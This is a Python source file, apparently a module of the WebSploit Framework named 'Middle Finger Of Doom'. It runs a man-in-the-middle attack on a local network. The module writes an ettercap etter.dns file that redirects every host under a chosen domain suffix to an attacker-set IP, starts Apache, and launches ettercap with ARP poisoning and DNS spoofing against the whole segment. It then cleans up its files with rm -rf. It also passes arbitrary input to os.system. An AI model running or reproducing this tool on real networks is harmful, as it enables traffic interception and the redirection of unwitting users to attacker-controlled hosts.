#!/usr/bin/env python
#
# WebSploit Framework Middle Finger Of Doom(MFOD) Attack module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from core import wcolors
from core import help
from time import sleep
options = ["eth0", "192.168.1.1", ".com"]
def mfod():
	try:
		line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line_1 += ":"
		line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "MFOD" + wcolors.color.ENDC
		line_1 += " > "
		com = raw_input(line_1)
		com = com.lower()
		if com[0:13] =='set interface':
			options[0] = com[14:20]
			print "INTERFACE => ", options[0]
			mfod()
		elif com[0:11] =='set redhost':
			options[1] = com[12:27]
			print "REDHOST => ", options[1]
			mfod()
		elif com[0:10] =='set domain':
			options[2] = com[11:19]
			print "DOMAIN => ", options[2]
			mfod()
		elif com[0:12] =='show options':
			print ""
			print "Options\t\t Value\t\t\t RQ\t Description"
			print "---------\t--------------\t\t----\t--------------"
			print "Interface\t"+options[0]+"\t\t\tyes\tNetwork Interface Name"
			print "REDHOST\t\t"+options[1]+"\t\tyes\tIP Address Of Any Host For Redirect Victim"
			print "DOMAIN\t\t"+options[2]+"\t\t\tyes\tType Of Domain (ex:.com)"
			print ""
			mfod()
		elif com[0:2] =='os':
			os.system(com[3:])
			mfod()
		elif com[0:4] =='help':
			help.help()
			mfod()
		elif com[0:4] =='back':
			pass
		elif com[0:3] =='run':
			sleep(2)
			subprocess.Popen('/etc/init.d/apache2 start', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			try:
				os.chdir('/usr/local/share/ettercap')
				check_dir = os.listdir(os.curdir)
				if 'etter.dns' in check_dir:
					os.system('mv /usr/local/share/ettercap/etter.dns etter.dns.old')
				my_etter = open('etter.dns', 'w')
				my_etter.write('*'+ options[2] + '\tA' + '\t'+ options[1])
				my_etter.close()
			except(OSError):
				print(wcolors.color.RED + wcolors.color.BOLD + "[*]Checking Ettercap ... Please Wait ..." + wcolors.color.ENDC)
			try:
				os.chdir('/usr/share/ettercap')
				check_dir = os.listdir(os.curdir)
				if 'etter.dns' in check_dir:
					os.system('mv /usr/share/ettercap/etter.dns etter.dns.old')
				my_etter = open('etter.dns', 'w')
				my_etter.write('*'+ options[2] + '\tA' + '\t'+ options[1])
				my_etter.close()
			except(OSError):
				print(wcolors.color.RED + wcolors.color.BOLD + "[*]Checking Ettercap ... Please Wait ..." + wcolors.color.ENDC)
			print(wcolors.color.BOLD + wcolors.color.BLUE + "[*]DNS Spoofing Starting ..." + wcolors.color.ENDC)
			dns_spoofing = 'ettercap -Tqi ' + options[0] + ' -M arp // // -P dns_spoof'
			subprocess.Popen(dns_spoofing, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			print(wcolors.color.BOLD + wcolors.color.BLUE + "[*]MFOD Attack Has Been Started." + wcolors.color.ENDC)
			print(wcolors.color.BOLD + wcolors.color.RED + "[*]Notice : After Attack Press [ENTER] For Cleanup [tmp] File's" + wcolors.color.ENDC)
			line_4 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
			line_4 += ":"
			line_4 += wcolors.color.UNDERL + wcolors.color.BLUE + "MFOD" + wcolors.color.ENDC
			line_4 += " > After Your Attack Finished Press [Enter] For Cleanup : "
			cln_enter = raw_input(line_4)
			print(wcolors.color.YELLOW + "[*]Cleaning [tmp] File's For Next Attack , Please Wait ..." + wcolors.color.ENDC)
			sleep(2)
			os.system('rm -rf /usr/local/share/ettercap/etter.dns')
			os.system('rm -rf /usr/share/ettercap/etter.dns')
			os.system('killall ettercap')
			print(wcolors.color.GREEN + "Cleanup Successfully." + wcolors.color.ENDC)
		else:
			print "Wrong Command => ", com
	except(KeyboardInterrupt,OSError):
			print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)
